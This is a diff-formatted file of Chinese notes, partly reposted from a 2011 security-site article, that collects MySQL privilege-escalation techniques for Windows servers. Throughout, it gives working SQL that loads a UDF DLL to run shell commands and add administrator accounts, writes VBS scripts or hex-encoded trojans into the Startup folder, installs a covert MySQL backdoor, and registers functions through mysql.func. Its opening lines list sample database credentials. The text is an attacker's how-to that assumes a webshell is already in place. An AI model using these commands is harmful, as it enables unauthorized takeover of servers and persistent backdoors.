@@ -1,0 +1,79 @@
+mstsc
+inc目录
+conn.php config.php web.php
+$dbhost = 'localhost';   // 数据库服务器
+$dbuser = 'root';   // 数据库用户名
+$dbpw = 'admin11';    // 数据库密码
+$dbname = 'bbs';   // 数据库名
+C:\Winnt\udf.dll    2000
+C:\Windows\udf.dll 2003
+现在基本上win的服务器就这两个导出UDF.DLL
+create function cmdshell returns string soname 'udf.dll'
+select cmdshell('net user wjs wjs /add');  
+select cmdshell('net localgroup administrators wjs /add');  
+drop function cmdshell;
+
+
+
+mysql提权语句归纳
+www.hx99.net    时间: 2011-05-07    阅读: 次     整理: 华西安全网
+mysql提权语句归纳如下：
+
+一 UDF提权 
+
+这类提权方法我想大家已经知道了，我大致写一下，具体语句如下： 
+
+create function cmdshell returns string soname ’udf.dll’ 
+select cmdshell(’net user iis_user 123!@#abcABC /add’); 
+select cmdshell(’net localgroup administrators iis_user /add’); 
+select cmdshell(’regedit /s d:\web\3389.reg’); 
+drop function cmdshell; 
+select cmdshell(’netstat -an’); 
+
+
+二 VBS启动项提权 
+
+create table a (cmd text); 
+insert into a values ("set wshshell=createobject (""wscript.shell"") " ); 
+insert into a values ("a=wshshell.run (""cmd.exe /c net user iis_user 123!@#abcABC /add"",0) " ); 
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators iis_user /add"",0) " ); 
+select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs"; 
+
+
+先在webshell里连接上数据库,建立表，将VBS写入表里，然后导入启动项，如果UDF提权不行的话也可以尝试下这个方法，前提是要有ROOT权限，后面有个,0表示不弹出CMD窗口，安静的运行。 
+
+
+还可以这样写: 
+
+create table a (cmd BLOB); 
+insert into a values （CONVERT(木马的16进制代码,CHAR)); 
+select * from a into dumpfile ’C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\启动\\mm.exe’ 
+drop table a; 
+执行前3条语句，就可以将木马写进启动里了，前提是木马一定要是16进制，还有就是路径要是\\，因为windows会自动过滤掉一个\ 
+
+
+三 Linx Mysql BackDoor提权 
+
+Linx Mysql Door 
+
+
+Mysql BackDoor是一款针对PHP+Mysql服务器开发的后门,该后门安装后为Mysql增加一个可以执行系统命令的"state"函数,并且随Mysql进程启动一个基于Dll的嗅探型后门,这个后门在Windows下拥有与Mysql一样的系统权限,从而巧妙的实现了无端口,无进程,无服务的穿墙木马. 
+
+
+用法：将Mysql.php传到PHP服务器上,点击"自动安装Mysql BackDoor"，然后直接执行命令即可 
+四，MIX.DLL提权 
+
+create table temp_mix(abc longblob); 
+insert into temp_mix values(load_file(’D:\\web\\udf.dll’)); 
+select * from temp_mix into dumpfile ’C:\\Windows\\system32\\udf.dll’; 
+create function MyCmd returns string soname ’udf.dll’; 
+select MyCmd(’net user’); 
+drop table if exists temp_mix; 
+
+前三句主要目的是把DLL放到系统目录.第4句建立函数.然后就可以执行系统命令了。而最容易出问题的就是第4句:can’t open shared library ’udf.dll’(error 2);就说下他. 
+
+先前的时候.有次提权.可以建立函数.也忘了什么原因了.需要重新建下这个函数.首先百度了下.说得是:drop function MyCmd; 就可以删到已经建立的函数.测试了下.发现还是不行.然后继续找的时候.说这是MYSQL的一个BUG.可以执行如下语句:delete from mysql.func where name=’MyCmd’;.测试了下成功了.前天再次盯着屏幕上的can’t open shared library ’udf.dll’.又看到了这条delete语句.我们知道delete就是删除.是删的表里的东西.删下表就可以删了函数了?那反过来.建立函数是不是就是往表里插入一条新记录?而且是mysql.func.也就是mysql这个库里的func表.呵呵.看名字也象.测试一番后.得出如下结果: 
+
+
+在提权的时候.建立函数显示can’t open shared library ’udf.dll’.就干脆跳过这句.执行另外一句.或者说.把第4句换成:insert into mysql.func values(’MyCmd’,0,’udf.dll’,’function’);.说下func这个表的结构:4列.name,return,dl,fun.第二列和第四列的名字记不大清楚了.但意思一样.有兴趣可以自己select * from func;下就知道了.第一列就是新建函数的名字.字符串.第二列是返回值.填0.第三列dl指函数所在的dll名字.字符串类型.这里为我们导到系统目录里的dll名.不一定是udf.dll.只要跟你导出的一样就行.第四列作用不清楚.但是填上funciton这个字符串就能用.应该是指这个是个函数吧...因为这只是个插入操作.所以只要是root.应该不会有错误的.后面的就一样了.select MyCmd(’whoami’);.但是别急!这里有个前提:需要重启MYSQL..我对MYSQL不了解.但是重启后新建的函数绝对可用.貌似有别的办法可以达到同样的效果.好象是flush.但是具体flush哪里.就不知道了.不过不是权限.也不是func表.试过了.而且MYSQL下.搜了很久也没找到root在MYSQL下通过命令重启的.
+
